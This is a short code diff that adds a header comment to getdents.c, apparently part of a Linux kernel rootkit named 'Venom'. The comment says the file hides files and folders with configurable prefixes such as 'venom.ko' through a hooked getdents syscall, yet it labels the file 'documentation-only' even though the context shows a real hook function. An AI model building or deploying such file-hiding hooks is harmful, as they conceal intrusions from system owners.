@@ -1,3 +1,23 @@
+/*
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: getdents.c
+ *
+ * Purpose:
+ *  - Documentation-first discussion of directory enumeration touchpoints
+ *    (e.g., getdents / getdents64 paths) and observable behaviors when
+ *    listings are filtered or manipulated.
+ *
+ * Contents (documentation-only):
+ *  - Hides files and folders containing these prefixes: (trevohack, .secret, source, _defense, venom.ko) 
+ *    these can be customized 
+ *
+ * Author:  Trevohack 
+ */
+
+
+
+
 #ifndef GETDENTS_H
 #define GETDENTS_H
 
@@ -107,3 +127,4 @@ notrace static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
 }
 
 #endif 
+
